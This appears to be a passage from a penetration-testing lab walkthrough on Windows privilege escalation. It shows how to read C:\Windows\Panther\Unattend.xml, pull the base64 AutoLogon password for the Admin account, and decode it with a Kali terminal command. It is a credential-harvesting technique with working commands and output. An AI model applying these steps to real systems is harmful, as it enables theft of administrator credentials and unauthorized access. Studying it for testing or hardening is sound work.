@@ -1,0 +1,86 @@
+
+```
+notepad C:\Windows\Panther\Unattend.xml
+```
+
+
+then just use
+
+Scroll down to the “Password” property and copy the base64 string that is confined between the “Value” tags underneath it.
+
+
+```
+PS C:\Users\user\Desktop\Tools\PowerUp> type C:\Windows\Panther\Unattend.xml
+<?xml version="1.0" encoding="utf-8"?>
+<unattend xmlns="urn:schemas-microsoft-com:unattend">
+    <settings pass="windowsPE">
+        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64"
+ publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <UserData>
+                <ProductKey>
+                    <WillShowUI>Always</WillShowUI>
+                </ProductKey>
+            </UserData>
+            <UpgradeData>
+                <Upgrade>true</Upgrade>
+                <WillShowUI>Always</WillShowUI>
+            </UpgradeData>
+        </component>
+        <component name="Microsoft-Windows-PnpCustomizationsWinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <DriverPaths>
+                <PathAndCredentials wcm:keyValue="1" wcm:action="add">
+                    <Path>$WinPEDriver$</Path>
+                </PathAndCredentials>
+            </DriverPaths>
+        </component>
+    </settings>
+    <settings pass="specialize">
+        <component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <RunSynchronous>
+                <RunSynchronousCommand wcm:action="add">
+                    <Order>1</Order>
+                    <Path>cmd /c "FOR %i IN (X F E D C) DO (FOR /F "tokens=6" %t in ('vol %i:') do (IF /I %t NEQ "" (IF EXIST %i:\BootCamp\BootCamp.xml Reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v AppsRoot /t REG_SZ /d %i /f )))"</Path>
+                </RunSynchronousCommand>
+            </RunSynchronous>
+        </component>
+    </settings>
+    <settings pass="oobeSystem">
+        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <FirstLogonCommands>
+              <SynchronousCommand wcm:action="add">
+                <Description>AMD CCC Setup</Description>
+                <CommandLine>%AppsRoot%:\BootCamp\Drivers\ATI\ATIGraphics\Bin64\ATISetup.exe -Install</CommandLine>
+                <Order>1</Order>
+                <RequiresUserInput>false</RequiresUserInput>
+              </SynchronousCommand>
+              <SynchronousCommand wcm:action="add">
+                  <Description>BootCamp setup</Description>
+                  <CommandLine>%AppsRoot%:\BootCamp\setup.exe</CommandLine>
+                  <Order>2</Order>
+                  <RequiresUserInput>false</RequiresUserInput>
+              </SynchronousCommand>
+            </FirstLogonCommands>
+            <AutoLogon>
+                <Password>
+                    <Value>cGFzc3dvcmQxMjM=</Value>
+                    <PlainText>false</PlainText>
+                </Password>
+                <Enabled>true</Enabled>
+                <Username>Admin</Username>
+            </AutoLogon>
+        </component>
+    </settings>
+</unattend>
+PS C:\Users\user\Desktop\Tools\PowerUp>
+```
+
+ In a terminal, type: 
+ 
+ 
+ `echo [copied base64] | base64 -d`
+
+
+```
+kali@kali ~> echo "cGFzc3dvcmQxMjM=" | base64 -d
+password123
+```
